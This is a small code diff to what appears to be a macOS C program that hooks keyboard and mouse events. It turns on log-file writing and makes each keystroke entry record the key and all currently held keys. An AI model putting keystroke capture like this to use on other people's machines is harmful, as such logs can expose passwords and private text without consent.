@@ -1,5 +1,5 @@
 /**********************************/
-#define WRITE_LOG_FILE          false
+#define WRITE_LOG_FILE          true
 #define DELETE_DATABASE_FILE    true
 #define LOG_TIME_ENABLED        false
 #define LOG_PATH_ENABLED        true
@@ -121,7 +121,11 @@ CGEventMask mouse_and_kb_events = (
 void append_keystroke_log(const char *ckc){
   char *l = malloc(1024);
 
-  sprintf(l, "%lu:%s\n", timestamp(), (char *)ckc);
+  sprintf(l, "%lu> key=%s | downkeys=%s\n"
+          , timestamp()
+          , (char *)ckc
+          , get_downkeys_strs()
+          );
   fsio_append_text_file(logfileLocation, l);
 }
 
